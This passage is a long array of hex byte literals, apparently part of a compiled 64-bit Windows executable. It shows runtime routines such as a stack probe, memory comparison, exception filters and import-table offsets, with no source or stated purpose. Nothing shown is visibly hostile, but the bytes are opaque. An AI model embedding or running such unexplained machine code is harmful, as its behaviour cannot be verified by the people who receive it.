0x5, 0x6d, 0xc6, 0x0, 0x0, 0x9, 0x4, 0x0, 0xc0, 0xc7, 0x5, 0x67, 0xc6, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xc7, 0x5, 0x71, 0xc6, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x8, 0x0, 0x0, 0x0, 0x48, 0x6b, 0xc0, 0x0, 0x48, 0x8d, 0xd, 0x69, 0xc6, 0x0, 0x0, 0x8b, 0x54, 0x24, 0x30, 0x48, 0x89, 0x14, 0x1, 0x48, 0x8d, 0xd, 0x4a, 0x86, 0x0, 0x0, 0xe8, 0x4d, 0xfe, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0xd9, 0xff, 0x15, 0xed, 0xe, 0x0, 0x0, 0x48, 0x8b, 0xbb, 0xf8, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x50, 0x48, 0x8b, 0xcf, 0x45, 0x33, 0xc0, 0xff, 0x15, 0xdd, 0xe, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x32, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x58, 0x48, 0x8b, 0x54, 0x24, 0x50, 0x4c, 0x8b, 0xc8, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x4c, 0x8b, 0xc7, 0x48, 0x8d, 0x4c, 0x24, 0x60, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x33, 0xc9, 0x48, 0x89, 0x5c, 0x24, 0x20, 0xff, 0x15, 0xae, 0xe, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x68, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x56, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0xd9, 0xff, 0x15, 0x7f, 0xe, 0x0, 0x0, 0x48, 0x8b, 0xb3, 0xf8, 0x0, 0x0, 0x0, 0x33, 0xff, 0x45, 0x33, 0xc0, 0x48, 0x8d, 0x54, 0x24, 0x60, 0x48, 0x8b, 0xce, 0xff, 0x15, 0x6d, 0xe, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x39, 0x48, 0x83, 0x64, 0x24, 0x38, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x68, 0x48, 0x8b, 0x54, 0x24, 0x60, 0x4c, 0x8b, 0xc8, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x4c, 0x8b, 0xc6, 0x48, 0x8d, 0x4c, 0x24, 0x70, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x33, 0xc9, 0x48, 0x89, 0x5c, 0x24, 0x20, 0xff, 0x15, 0x3e, 0xe, 0x0, 0x0, 0xff, 0xc7, 0x83, 0xff, 0x2, 0x7c, 0xb1, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0x5e, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x83, 0xec, 0x10, 0x4c, 0x89, 0x14, 0x24, 0x4c, 0x89, 0x5c, 0x24, 0x8, 0x4d, 0x33, 0xdb, 0x4c, 0x8d, 0x54, 0x24, 0x18, 0x4c, 0x2b, 0xd0, 0x4d, 0xf, 0x42, 0xd3, 0x65, 0x4c, 0x8b, 0x1c, 0x25, 0x10, 0x0, 0x0, 0x0, 0x4d, 0x3b, 0xd3, 0x73, 0x16, 0x66, 0x41, 0x81, 0xe2, 0x0, 0xf0, 0x4d, 0x8d, 0x9b, 0x0, 0xf0, 0xff, 0xff, 0x41, 0xc6, 0x3, 0x0, 0x4d, 0x3b, 0xd3, 0x75, 0xf0, 0x4c, 0x8b, 0x14, 0x24, 0x4c, 0x8b, 0x5c, 0x24, 0x8, 0x48, 0x83, 0xc4, 0x10, 0xc3, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0x59, 0x38, 0x48, 0x8b, 0xf2, 0x4d, 0x8b, 0xf0, 0x48, 0x8b, 0xe9, 0x49, 0x8b, 0xd1, 0x48, 0x8b, 0xce, 0x49, 0x8b, 0xf9, 0x4c, 0x8d, 0x43, 0x4, 0xe8, 0x24, 0xfc, 0xff, 0xff, 0x8b, 0x45, 0x4, 0x24, 0x66, 0xf6, 0xd8, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x45, 0x1b, 0xc0, 0x41, 0xf7, 0xd8, 0x44, 0x3, 0xc0, 0x44, 0x85, 0x43, 0x4, 0x74, 0x11, 0x4c, 0x8b, 0xcf, 0x4d, 0x8b, 0xc6, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0xe8, 0x6c, 0x4e, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x8b, 0x7c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0xcc, 0xe9, 0xc3, 0x78, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf8, 0x48, 0x8b, 0xd9, 0xe8, 0x8b, 0x40, 0xff, 0xff, 0xf6, 0x43, 0x4, 0x66, 0x75, 0xd, 0x81, 0x3b, 0x63, 0x73, 0x6d, 0xe0, 0x75, 0x5, 0x83, 0xf8, 0x1, 0x74, 0xb, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0x2c, 0x47, 0xff, 0xff, 0x48, 0x89, 0x58, 0x20, 0xe8, 0x23, 0x47, 0xff, 0xff, 0x48, 0x89, 0x78, 0x28, 0xe8, 0x4a, 0x78, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x2b, 0xd1, 0x49, 0x83, 0xf8, 0x8, 0x72, 0x22, 0xf6, 0xc1, 0x7, 0x74, 0x14, 0x66, 0x90, 0x8a, 0x1, 0x3a, 0x4, 0x11, 0x75, 0x2c, 0x48, 0xff, 0xc1, 0x49, 0xff, 0xc8, 0xf6, 0xc1, 0x7, 0x75, 0xee, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x3, 0x75, 0x1f, 0x4d, 0x85, 0xc0, 0x74, 0xf, 0x8a, 0x1, 0x3a, 0x4, 0x11, 0x75, 0xc, 0x48, 0xff, 0xc1, 0x49, 0xff, 0xc8, 0x75, 0xf1, 0x48, 0x33, 0xc0, 0xc3, 0x1b, 0xc0, 0x83, 0xd8, 0xff, 0xc3, 0x90, 0x49, 0xc1, 0xe9, 0x2, 0x74, 0x37, 0x48, 0x8b, 0x1, 0x48, 0x3b, 0x4, 0x11, 0x75, 0x5b, 0x48, 0x8b, 0x41, 0x8, 0x48, 0x3b, 0x44, 0x11, 0x8, 0x75, 0x4c, 0x48, 0x8b, 0x41, 0x10, 0x48, 0x3b, 0x44, 0x11, 0x10, 0x75, 0x3d, 0x48, 0x8b, 0x41, 0x18, 0x48, 0x3b, 0x44, 0x11, 0x18, 0x75, 0x2e, 0x48, 0x83, 0xc1, 0x20, 0x49, 0xff, 0xc9, 0x75, 0xcd, 0x49, 0x83, 0xe0, 0x1f, 0x4d, 0x8b, 0xc8, 0x49, 0xc1, 0xe9, 0x3, 0x74, 0x9b, 0x48, 0x8b, 0x1, 0x48, 0x3b, 0x4, 0x11, 0x75, 0x1b, 0x48, 0x83, 0xc1, 0x8, 0x49, 0xff, 0xc9, 0x75, 0xee, 0x49, 0x83, 0xe0, 0x7, 0xeb, 0x83, 0x48, 0x83, 0xc1, 0x8, 0x48, 0x83, 0xc1, 0x8, 0x48, 0x83, 0xc1, 0x8, 0x48, 0x8b, 0xc, 0xa, 0x48, 0xf, 0xc8, 0x48, 0xf, 0xc9, 0x48, 0x3b, 0xc1, 0x1b, 0xc0, 0x83, 0xd8, 0xff, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xe0, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0x25, 0xea, 0xd, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x8a, 0x4d, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x7e, 0x34, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x8a, 0x4d, 0x20, 0xe8, 0x6c, 0x34, 0xff, 0xff, 0x90, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0xcd, 0x32, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x1, 0x8b, 0x10, 0x48, 0x89, 0x4c, 0x24, 0x28, 0x89, 0x54, 0x24, 0x20, 0x4c, 0x8d, 0xd, 0x2, 0x2d, 0xff, 0xff, 0x4c, 0x8b, 0x45, 0x70, 0x8b, 0x55, 0x68, 0x48, 0x8b, 0x4d, 0x60, 0xe8, 0xe, 0x32, 0xff, 0xff, 0x90, 0x48, 0x83, 0xc4, 0x30, 0x5d, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x1, 0x33, 0xc9, 0x81, 0x38, 0x5, 0x0, 0x0, 0xc0, 0xf, 0x94, 0xc1, 0x8b, 0xc1, 0x5d, 0xc3, 0xcc, 0x40, 0x53, 0x55, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0xea, 0x48, 0x89, 0x4d, 0x38, 0x48, 0x89, 0x4d, 0x30, 0x80, 0x7d, 0x58, 0x0, 0x74, 0x6c, 0x48, 0x8b, 0x45, 0x30, 0x48, 0x8b, 0x8, 0x48, 0x89, 0x4d, 0x28, 0x48, 0x8b, 0x45, 0x28, 0x81, 0x38, 0x63, 0x73, 0x6d, 0xe0, 0x75, 0x55, 0x48, 0x8b, 0x45, 0x28, 0x83, 0x78, 0x18, 0x4, 0x75, 0x4b, 0x48, 0x8b, 0x45, 0x28, 0x81, 0x78, 0x20, 0x20, 0x5, 0x93, 0x19, 0x74, 0x1a, 0x48, 0x8b, 0x45, 0x28, 0x81, 0x78, 0x20, 0x21, 0x5, 0x93, 0x19, 0x74, 0xd, 0x48, 0x8b, 0x45, 0x28, 0x81, 0x78, 0x20, 0x22, 0x5, 0x93, 0x19, 0x75, 0x24, 0xe8, 0xf5, 0x44, 0xff, 0xff, 0x48, 0x8b, 0x4d, 0x28, 0x48, 0x89, 0x48, 0x20, 0x48, 0x8b, 0x45, 0x30, 0x48, 0x8b, 0x58, 0x8, 0xe8, 0xe0, 0x44, 0xff, 0xff, 0x48, 0x89, 0x58, 0x28, 0xe8, 0x7, 0x76, 0xff, 0xff, 0x90, 0xc7, 0x45, 0x20, 0x0, 0x0, 0x0, 0x0, 0x8b, 0x45, 0x20, 0x48, 0x83, 0xc4, 0x28, 0x5d, 0x5b, 0xc3, 0xcc, 0x40, 0x53, 0x55, 0x48, 0x83, 0xec, 0x48, 0x48, 0x8b, 0xea, 0x48, 0x89, 0x4d, 0x50, 0x48, 0x89, 0x4d, 0x48, 0xe8, 0xad, 0x44, 0xff, 0xff, 0x48, 0x8b, 0x8d, 0x80, 0x0, 0x0, 0x0, 0x48, 0x89, 0x48, 0x70, 0x48, 0x8b, 0x45, 0x48, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x59, 0x38, 0xe8, 0x92, 0x44, 0xff, 0xff, 0x48, 0x89, 0x58, 0x68, 0x48, 0x8b, 0x4d, 0x48, 0xc6, 0x44, 0x24, 0x38, 0x1, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x83, 0x64, 0x24, 0x28, 0x0, 0x48, 0x8b, 0x85, 0xa0, 0x0, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4c, 0x8b, 0x8d, 0x98, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0x85, 0x90, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x95, 0x88, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x9, 0xe8, 0x5d, 0x5b, 0xff, 0xff, 0xe8, 0x4c, 0x44, 0xff, 0xff, 0x48, 0x83, 0x60, 0x70, 0x0, 0xc7, 0x45, 0x40, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x48, 0x5d, 0x5b, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x89, 0x4d, 0x58, 0x4c, 0x8d, 0x45, 0x20, 0x48, 0x8b, 0x95, 0xb8, 0x0, 0x0, 0x0, 0xe8, 0x2e, 0x60, 0xff, 0xff, 0x90, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0x40, 0x53, 0x55, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x4d, 0x38, 0xe8, 0x33, 0x4a, 0xff, 0xff, 0x83, 0x7d, 0x20, 0x0, 0x75, 0x3a, 0x48, 0x8b, 0x9d, 0xb8, 0x0, 0x0, 0x0, 0x81, 0x3b, 0x63, 0x73, 0x6d, 0xe0, 0x75, 0x2b, 0x83, 0x7b, 0x18, 0x4, 0x75, 0x25, 0x8b, 0x43, 0x20, 0x2d, 0x20, 0x5, 0x93, 0x19, 0x83, 0xf8, 0x2, 0x77, 0x18, 0x48, 0x8b, 0x4b, 0x28, 0xe8, 0x56, 0x40, 0xff, 0xff, 0x85, 0xc0, 0x74, 0xb, 0xb2, 0x1, 0x48, 0x8b, 0xcb, 0xe8, 0xd4, 0x3f, 0xff, 0xff, 0x90, 0xe8, 0xb6, 0x43, 0xff, 0xff, 0x48, 0x8b, 0x8d, 0xc0, 0x0, 0x0, 0x0, 0x48, 0x89, 0x48, 0x20, 0xe8, 0xa6, 0x43, 0xff, 0xff, 0x48, 0x8b, 0x4d, 0x40, 0x48, 0x89, 0x48, 0x28, 0x48, 0x83, 0xc4, 0x28, 0x5d, 0x5b, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0xe8, 0x68, 0x40, 0xff, 0xff, 0x90, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0xe8, 0x72, 0x43, 0xff, 0xff, 0x83, 0x78, 0x30, 0x0, 0x7e, 0x8, 0xe8, 0x67, 0x43, 0xff, 0xff, 0xff, 0x48, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x45, 0x48, 0x8b, 0x8, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0xe4, 0x7e, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x89, 0x4d, 0x28, 0x48, 0x8b, 0x1, 0x8b, 0x8, 0x89, 0x4d, 0x24, 0x33, 0xc0, 0x81, 0xf9, 0x63, 0x73, 0x6d, 0xe0, 0xf, 0x94, 0xc0, 0x89, 0x45, 0x20, 0x8b, 0x45, 0x20, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x45, 0x68, 0x8b, 0x8, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x9d, 0x7e, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0xb9, 0x5, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x84, 0x7e, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0xb9, 0x7, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x6b, 0x7e, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x33, 0xc9, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x55, 0x7e, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x80, 0x7d, 0x70, 0x0, 0x74, 0xb, 0xb9, 0x3, 0x0, 0x0, 0x0, 0xe8, 0x3b, 0x7e, 0xff, 0xff, 0x90, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x4d, 0x48, 0x48, 0x8b, 0x9, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x91, 0xb0, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x85, 0x98, 0x0, 0x0, 0x0, 0x8b, 0x8, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0xfc, 0x7d, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x45, 0x58, 0x8b, 0x8, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0xe2, 0x7d, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0xb9, 0x4, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0xc9, 0x7d, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x45, 0x48, 0x8b, 0x8, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x6b, 0xca, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xea, 0x8b, 0x4d, 0x60, 0x48, 0x83, 0xc4, 0x30, 0x5d, 0xe9, 0x54, 0xca, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0xb9, 0x8, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xe9, 0x7f, 0x7d, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x4d, 0x40, 0x48, 0x83, 0xc4, 0x30, 0x5d, 0xe9, 0xdf, 0xaf, 0xff, 0xff, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x1, 0x81, 0x38, 0x5, 0x0, 0x0, 0xc0, 0x74, 0xc, 0x81, 0x38, 0x1d, 0x0, 0x0, 0xc0, 0x74, 0x4, 0x33, 0xc0, 0xeb, 0x5, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x40, 0x55, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x48, 0x8b, 0x1, 0x33, 0xc9, 0x81, 0x38, 0x5, 0x0, 0x0, 0xc0, 0xf, 0x94, 0xc1, 0x8b, 0xc1, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9e, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc2, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd2, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe4, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf4, 0x7f, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x16, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2c, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3c, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4c, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5e, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8e, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa4, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xbe, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd4, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x16, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2a, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x46, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x76, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x92, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8c, 0x85, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb4, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc2, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xda, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xea, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfa, 0x81, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x12, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2a, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x42, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6a, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x76, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x84, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x92, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9c, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xaa, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xbc, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xce, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xde, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x82, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x26, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x3a, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x72, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7e, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8a, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9e, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xae, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc0, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xca, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd6, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe2, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf4, 0x83, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1c, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x32, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4c, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x66, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x72, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8e, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x98, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xa8, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xba, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xca, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd8, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xea, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf6, 0x84, 0x1, 0x0, 0x0, 0x0, 0x0, 